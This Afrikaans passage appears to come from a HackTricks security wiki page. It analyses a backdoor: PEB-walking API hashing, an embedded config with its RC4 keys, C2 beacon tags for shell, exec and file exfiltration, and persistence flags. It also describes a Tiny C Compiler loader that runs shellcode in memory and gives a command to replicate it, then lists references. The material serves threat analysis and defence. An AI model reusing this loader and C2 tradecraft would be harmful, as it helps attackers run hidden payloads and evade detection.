- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** loop, elke exporttabel in 4-byte blokke pars met Murmur-styl mengsels, en slegs terugval na `GetProcAddress` as die hash nie gevind word nie.

Ingebedde konfigurasie & C2
- Konfigurasie lê binne die neergesette `BluetoothService` lêer by **offset 0x30808** (grootte **0x980**) en is RC4-gedesifreer met sleutel `qwhvb^435h&*7`, wat die C2-URL en User-Agent openbaar maak.
- Beacons bou 'n punt-geskeide host-profiel, voorvoeg tag `4Q`, dan RC4-enkripteer met sleutel `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Antwoorde word RC4-gedesifreer en deur 'n tag-skeiding versprei (`4T` shell, `4V` proses exec, `4W/4X` lêer-skryf, `4Y` lees/exfil, `4\\` uninstall, `4` skyf/lêer-omloop + gebrokebedeling gevalle).
- Uitvoeringsmodus word deur CLI-args gehek: geen args = installeer persistentie (service/Run key) wys na `-i`; `-i` herbegin self met `-k`; `-k` slaan installasie oor en loop die payload.

Alternatiewe loader waargeneem
- Dieselfde intrusie het Tiny C Compiler neergesit en `svchost.exe -nostdlib -run conf.c` uitgevoer vanaf `C:\ProgramData\USOShared\`, met `libtcc.dll` langs dit. Die aanvaller-verskafde C-bron het shellcode ingebed, dit gecompileer, en in-geheue gelopen sonder om die skyf met 'n PE te raak. Repliseer met:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-based compile-and-run stage het `Wininet.dll` tydens runtime geïmporteer en 'n second-stage shellcode van 'n hardgekodeerde URL gelaai, wat 'n buigsame loader geskep het wat as 'n compiler run vermom is.

## Verwysings

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
